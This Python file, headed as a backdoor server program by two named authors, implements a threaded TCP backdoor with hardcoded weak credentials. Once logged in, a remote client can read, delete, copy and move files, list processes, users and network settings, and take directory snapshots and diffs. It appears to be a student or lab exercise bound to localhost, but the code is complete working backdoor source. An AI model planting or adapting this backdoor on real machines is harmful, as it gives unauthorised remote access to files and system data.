#Authors: Rumen Kasabov, Michael Radke
#Backdoor server program.

import socketserver
import socket, threading
import hashlib
import sys
import subprocess
import os


class MyTCPHandler(socketserver.BaseRequestHandler):
    BUFFER_SIZE = 4096

    #Hardcoded credentials
    __USERNAME = "boss"
    __PASSCODE = "badpassword"

    #Boolean used to close server if user triggers off command
    close_server = False

    print("Server is now running.")

    def handle(self):

        #Handshake (check if user enters correct username and password
        try:

            #Prompt for username and password
            self.request.sendall(bytearray("Give me the username!\n", "utf-8"))
            username = self.request.recv(self.BUFFER_SIZE)

            username = username.decode("utf-8")
            username = username.strip()

            self.request.sendall(bytearray("Now give me the password!\n", "utf-8"))
            password = self.request.recv(self.BUFFER_SIZE)

            password = password.decode("utf-8")
            password = password.strip()

            #If both are correct, the user is authenticated
            if username == self.__USERNAME and password == self.__PASSCODE:

                self.request.sendall(bytearray("Welcome back boss.\n", "utf-8"))


            #Otherwise disconnect the user
            else:
                self.request.sendall(bytearray("Wrong username or password\n", "utf-8"))
                quit()


        except:

            #Quit current thread if user disconnects without authenticating first (not using logout)
            quit()

        #Main loop that keeps server-user connection and interaction with commands until they quit or turn off the server
        while 1:

            #Reads in client input
            data = self.request.recv(self.BUFFER_SIZE)

            if len(data) == self.BUFFER_SIZE:
                while 1:

                    try:  # error means no more data
                        data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)

                    except:
                        break

            #If data input is of length 0 break out of connection (something went wrong)
            if len(data) == 0:
                break

            data = data.decode("utf-8")

            # Remove leading and trailing spaces
            data = data.strip()

            #All statements below check which command has been invoked by client and execute it
            if data == "help":
                self.request.sendall(bytearray(
                    "The supported commands are pwd, cd, ls, cp, rm, mv, cat, snap, diff, logout, off, help <command>, who, net, ps, uptime\n",
                    "utf-8"))

            #If the help <command> given, the statement checks for a blank after help and goes on to return help for
            #that command
            elif data[0:5] == "help ":

                # Strip any spaces in-between help and command
                command = str.strip(data[5:])

                # Check which command the user is seeking info on and return info on it
                if command == "pwd":

                    self.request.sendall(bytearray("pwd - returns the current working directory\n", "utf-8"))

                elif command == "cd":
                    self.request.sendall(
                        bytearray("cd <dir> - change the current working directory to <dir>\n", "utf-8"))

                elif command == "ls":
                    self.request.sendall(
                        bytearray("ls - list the contents of the current working directory\n", "utf-8"))

                elif command == "cp":
                    self.request.sendall(bytearray("cp <file1> <file2> - copy file 1 to file 2\n", "utf-8"))

                elif command == "rm":
                    self.request.sendall(bytearray("rm <file> - delete file\n", "utf-8"))

                elif command == "mv":
                    self.request.sendall(bytearray("mv <file1> <file2> - rename file1 to file2\n", "utf-8"))

                elif command == "cat":
                    self.request.sendall(bytearray("cat <file> - return contents of file\n", "utf-8"))

                elif command == "snap":
                    self.request.sendall(bytearray(
                        "snap - take a snapshot of all the files in the current directory and save it in memory\n",
                        "utf-8"))

                elif command == "diff":
                    self.request.sendall(bytearray(
                        "diff - compare the contents of the current directory to the saved snapshot, and report differences (deleted files, changed files and new files\n",
                        "utf-8"))

                elif command == "logout":
                    self.request.sendall(bytearray("logout - disconnect client\n", "utf-8"))

                elif command == "off":
                    self.request.sendall(bytearray("off - terminate the backdoor program\n", "utf-8"))

                elif command == "who":
                    self.request.sendall(bytearray("who - list user(s) currently logged in\n", "utf-8"))

                elif command == "net":
                    self.request.sendall(bytearray("net - show current networking configuration\n", "utf-8"))

                elif command == "ps":
                    self.request.sendall(bytearray("ps - show currently running processes\n", "utf-8"))

                elif command == "uptime":
                    self.request.sendall(bytearray("uptime - the amount of time the device has been on for\n", "utf-8"))

                else:
                    self.request.sendall(bytearray("No help command for " + command + "\n", "utf-8"))


            elif data == "ls":

                # Run a subprocess in shell that returns output of ls -l into variable
                output = subprocess.run(['ls', '-l'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                # Decode the shell command result into a string format
                ls_command = output.stdout.decode("utf-8")

                # Send the string output to the client
                self.request.sendall(bytearray(ls_command, "utf-8"))

            elif data == "pwd":

                # Run a subprocess in shell that returns output of pwd into variable
                output = subprocess.run(['pwd'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                # Decode the shell command result into a string format
                pwd_command = output.stdout.decode("utf-8")

                # Send the string output to the client
                self.request.sendall(bytearray(pwd_command, "utf-8"))

                # If cat command is given without any parameters, display usage error
            elif data == "cat":
                self.request.sendall(bytearray("USAGE: cat <file>\n", "utf-8"))

            elif data[0:4] == "cat ":

                # Strip any spaces in-between cat and argument
                argument = str.strip(data[4:])

                try:

                    # Run a subprocess in shell that returns output of cat into variable
                    output = subprocess.run(['cat', argument], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                    # Decode the shell command result into a string format
                    cat_output = output.stdout.decode("utf-8")

                    # Send the string output to the client
                    self.request.sendall(bytearray(cat_output + "\n", "utf-8"))

                except:

                    print("FileNotFoundError")
                    self.request.sendall(bytearray("Invalid file type. Tried to read: " + argument + "\n", "utf-8"))



            elif data == "who":

                # Run a subprocess in shell that returns output of who into variable
                output = subprocess.run(['who'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                # Decode the shell command result into a string format
                who_output = output.stdout.decode("utf-8")

                # Send the string output to the client
                self.request.sendall(bytearray(who_output, "utf-8"))

            elif data == "net":

                # Run a subprocess in shell that returns output of net into variable
                output = subprocess.run(['net'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                # Decode the shell command result into a string format
                net_output = output.stdout.decode("utf-8")

                # Send the string output to the client
                self.request.sendall(bytearray(net_output, "utf-8"))

            elif data == "ps":

                # Run a subprocess in shell that returns output of ps into variable
                output = subprocess.run(['ps'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                # Decode the shell command result into a string format
                ps_output = output.stdout.decode("utf-8")

                # Send the string output to the client
                self.request.sendall(bytearray(ps_output, "utf-8"))

            elif data == "uptime":

                # Run a subprocess in shell that returns output of uptime into variable
                output = subprocess.run(['uptime'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                # Decode the shell command result into a string format
                uptime_output = output.stdout.decode("utf-8")

                # Send the string output to the client
                self.request.sendall(bytearray(uptime_output, "utf-8"))

            # If cd command is given without any parameters, display usage error
            elif data == "cd":
                self.request.sendall(bytearray("USAGE: cd <dir>\n", "utf-8"))

            elif data[0:3] == "cd ":

                # Strip any spaces in-between cd and argument
                argument = str.strip(data[3:])

                try:

                    # Change the current directory based on the provided argument
                    os.chdir(argument)

                    # Indicate successful cd to client
                    self.request.sendall(bytearray("OK\n", "utf-8"))

                except:

                    self.request.sendall(bytearray("cd: " + argument + ": No such file or directory\n", "utf-8"))

            elif data == "rm":
                self.request.sendall(bytearray("USAGE: rm <file>\n", "utf-8"))

            elif data[0:3] == "rm ":

                # Strip any spaces in-between rm and argument
                argument = str.strip(data[3:])

                try:

                    # Run a subprocess in shell that returns output of rm into variable
                    output = subprocess.run(['rm', argument], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

                    # Decode the shell command result into a string format
                    rm_output = output.stdout.decode("utf-8")

                    # Send the string output to the client
                    if rm_output == "":
                        self.request.sendall(bytearray("OK", "utf-8"))

                    self.request.sendall(bytearray(rm_output, "utf-8"))

                except:

                    self.request.sendall(bytearray("rm: " + argument + ": No such file or directory\n", "utf-8"))

            elif data == "cp":
                self.request.sendall(bytearray("USAGE: cp <file1> <file2>\n", "utf-8"))

            elif data[0:3] == "cp ":

                # Strip any spaces in-between cp and its arguments
                arguments = str.strip(data[3:])

                # Find first whitespace in-between arguments (if two arguments provided)
                arguments = arguments.split()

                # If the arguments given are greater than two, or less than two, give usage error
                if len(arguments) < 2 or len(arguments) > 2:

                    self.request.sendall(
                        bytearray("Error: invalid amount of arguments, cp takes two arguments\n", "utf-8"))
                    self.request.sendall(bytearray("USAGE: cp <file1> <file2>\n", "utf-8"))

                else:

                    # Run a subprocess in shell that returns output of cp into variable
                    output = subprocess.run(['cp', arguments[0], arguments[1]], stdout=subprocess.PIPE,
                                            stderr=subprocess.STDOUT)

                    # Decode the shell command result into a string format
                    cp_output = output.stdout.decode("utf-8")

                    # Send the string output to the client
                    if cp_output == "":
                        self.request.sendall(bytearray("OK", "utf-8"))

                    self.request.sendall(bytearray(cp_output + "\n", "utf-8"))

            elif data == "mv":
                self.request.sendall(bytearray("USAGE: mv <file1> <file2>\n", "utf-8"))

            elif data[0:3] == "mv ":

                # Strip any spaces in-between mv and its arguments
                arguments = str.strip(data[3:])

                # Find first whitespace in-between arguments (if two arguments provided)
                arguments = arguments.split()

                # If the arguments given are greater than two, or less than two, give usage error
                if len(arguments) < 2 or len(arguments) > 2:

                    self.request.sendall(
                        bytearray("Error: invalid amount of arguments, mv takes two arguments\n", "utf-8"))
                    self.request.sendall(bytearray("USAGE: mv <file1> <file2>\n", "utf-8"))

                else:

                    # Run a subprocess in shell that returns output of cp into variable
                    output = subprocess.run(['mv', arguments[0], arguments[1]], stdout=subprocess.PIPE,
                                            stderr=subprocess.STDOUT)

                    # Decode the shell command result into a string format
                    mv_output = output.stdout.decode("utf-8")

                    # Send the string output to the client
                    if mv_output == "":
                        self.request.sendall(bytearray("OK", "utf-8"))

                    self.request.sendall(bytearray(mv_output + "\n", "utf-8"))


            elif data == "snap":

                # Remove old snapshot (since we are taking a new one)
                subprocess.run(['rm', "snapshot.txt"], stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT)

                # Open new snapshot file with write permission
                new_snap = open('snapshot.txt', 'w')

                # Get the current working directory (as string)
                curr_directory = os.getcwd()

                # For each file in the listed current directory, we create a hash digest
                for file in os.listdir(curr_directory):

                    if os.path.isfile(file):

                        # Generates an md5 hash algorithm
                        MD5 = hashlib.md5()

                        # Open current the current file as hashable
                        with open(file, 'rb') as hashable:

                            # Update the hash object MD5 with the data read from hashable
                            read_in = hashable.read()
                            MD5.update(read_in)

                            #Make sure not to include the snapshot itself when writing the filename and digests
                            if file != 'snapshot.txt':

                                # Write filename and digest to new file
                                new_snap.write(file + "\n" + MD5.hexdigest() + "\n")

                        hashable.close()

                new_snap.close()
                self.request.sendall(bytearray("Snapshot taken.\n", "utf-8"))

            elif data == "diff":

                #Var flag to check for any file difference
                any_difference = False

                #If snapshot.txt exists, we compare it to the current files in the directory
                if os.path.isfile("snapshot.txt"):

                    snapshot = []

                    #We read in the snapshot into an array for comparison
                    with open('snapshot.txt', 'r') as snapfile:
                        for line in snapfile:

                            line = line.strip()

                            snapshot.append(line)

                    snapfile.close()

                    diffshot = []

                    # Get the current working directory (as string)
                    curr_directory = os.getcwd()

                    # For each in the listed current directory, we create a hash digest
                    for file in os.listdir(curr_directory):

                        if os.path.isfile(file):

                            # Generates an md5 hash algorithm
                            MD5 = hashlib.md5()

                            # Open current the current file as hashable
                            with open(file, 'rb') as hashable:

                                # Update the hash object MD5 with the data read from hashable
                                read_in = hashable.read()
                                MD5.update(read_in)

                                if file != 'snapshot.txt':

                                    #Save the currrent dir diff snap in array (filename and hex digest)
                                    diffshot.append(file)
                                    diffshot.append(MD5.hexdigest())

                            hashable.close()

                    #If the current directory contains a file that is not in the snapshot, that files has been added
                    outer_counter = 0
                    while outer_counter < len(diffshot):

                        inner_counter = 0
                        while inner_counter < len(snapshot):

                            #If the file in the current directory (diffshot) is equal to the one in the snap
                            #break out of inner loop to check for the next in the current directory
                            if diffshot[outer_counter] == snapshot[inner_counter]:
                                break

                            #If the files are not matching, increment the snap counter to the next file position in snap
                            inner_counter = inner_counter + 2

                            #If the innercounter reaches the length of the snap (number of files and digests in it)
                            #before breaking out of its loop, then the length of the diffshot is
                            #larger meaning file(s) have been added
                            if inner_counter == len(snapshot):
                                self.request.sendall(bytearray(diffshot[outer_counter] + " has been added.\n", "utf-8"))
                                any_difference = True

                        #Increment outer counter to the next position in the current directory (diffshot)
                        outer_counter = outer_counter + 2


                    #If a file in the current directory contains a different digest than the one in the snapshot
                    #that file has been modified
                    outer_counter = 0
                    while outer_counter < len(snapshot):

                        inner_counter = 0
                        while inner_counter < len(diffshot):

                            #If the current file name in the directory is the same as the one in the snap
                            #but their digests are different, then that file has been modified
                            if diffshot[inner_counter] == snapshot[outer_counter] \
                                    and diffshot[inner_counter + 1] != snapshot[outer_counter + 1]:

                                self.request.sendall(bytearray(diffshot[inner_counter] + " has been modified.\n", "utf-8"))
                                any_difference = True


                            inner_counter = inner_counter + 2

                        outer_counter = outer_counter + 2

                    #If a file is listed in the snapshot but does not exists in the current directory, then that file
                    #has been deleted
                    outer_counter = 0
                    while outer_counter < len(snapshot):

                        inner_counter = 0
                        while inner_counter < len(diffshot):

                            #If both files match break out and check for next file in current directory
                            if snapshot[outer_counter] == diffshot[inner_counter]:
                                break

                            inner_counter = inner_counter + 2

                            #If the inner counter reaches the length of the diffshot (current directory files and digests)
                            #before breaking out of the loop, then the length of the snapshot is larger meaning a file has
                            #been deleted from the current directory
                            if inner_counter == len(diffshot):
                                self.request.sendall(bytearray(snapshot[outer_counter] + " has been deleted.\n", "utf-8"))
                                any_difference = True


                        outer_counter = outer_counter + 2

                    #If there is no difference in the files in directory, then report to user
                    if any_difference == False:
                        self.request.sendall(bytearray("No difference in files.\n", "utf-8"))



                #Otherwise no snapshot exists to compare diff to
                else:

                    self.request.sendall(bytearray("No snapshot in current directory.\n", "utf-8"))



            elif data == "logout":

                # Disconnect the client from the server
                self.request.sendall(bytearray("You have logged out of the server.\n", "utf-8"))

                # Break out of the while loop for the client thread, disconnecting the client
                break

            elif data == "off":

                self.request.sendall(bytearray("The server is now turning off. Goodnight World!\n", "utf-8"))

                # Set close server flag for cleanup
                self.close_server = True

                # Break out of the while loop, shutting off server
                break


            else:

                self.request.sendall(bytearray("Sorry, I don't understand this command. Try 'help' for a "
                                               "list of commands.\n", "utf-8"))

        if self.close_server == True:

            # Tell the serve_forever() loop to stop (shut down server)
            server.shutdown()

            # Clean up the server
            server.server_close()

            #In the case where socketserver does not respond...
            os._exit(0)


if __name__ == "__main__":
    HOST = "localhost"
    PORT = int(sys.argv[1])
    server = socketserver.ThreadingTCPServer((HOST, PORT), MyTCPHandler)
    server.serve_forever()